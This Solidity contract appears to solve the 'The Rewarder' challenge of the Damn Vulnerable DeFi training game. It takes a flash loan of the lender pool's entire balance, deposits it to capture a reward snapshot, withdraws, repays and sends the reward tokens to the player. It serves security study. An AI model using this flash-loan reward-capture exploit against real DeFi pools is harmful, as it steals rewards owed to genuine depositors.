// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import {RewardToken} from "./RewardToken.sol";

contract TheRewardee {
    address private player;
    FlashLoanerPool private lender;
    DamnValuableToken private token;
    TheRewarderPool private pool;
    RewardToken private rewardToken;

    constructor(FlashLoanerPool _lender, DamnValuableToken _token, TheRewarderPool _pool, RewardToken _rewardToken) {
        player = msg.sender;
        lender = _lender;
        token = _token;
        pool = _pool;
        rewardToken = _rewardToken;
    }

    function pwn() external {
        uint amount = token.balanceOf(address(lender));
        console.log("(pwn)", "amount=", amount);
        lender.flashLoan(amount);
    }

    function receiveFlashLoan(uint amount) external {
        console.log("(receiveFlashLoan)", "amount=", amount);
        require(msg.sender == address(lender));
        token.approve(address(pool), amount);
        pool.deposit(amount);
        uint rewarded = rewardToken.balanceOf(address(this));
        console.log("(receiveFlashLoan)", "rewarded=", rewarded);
        pool.withdraw(amount);
        token.transfer(address(lender), amount);
        rewardToken.transfer(player, rewarded);
    }
}
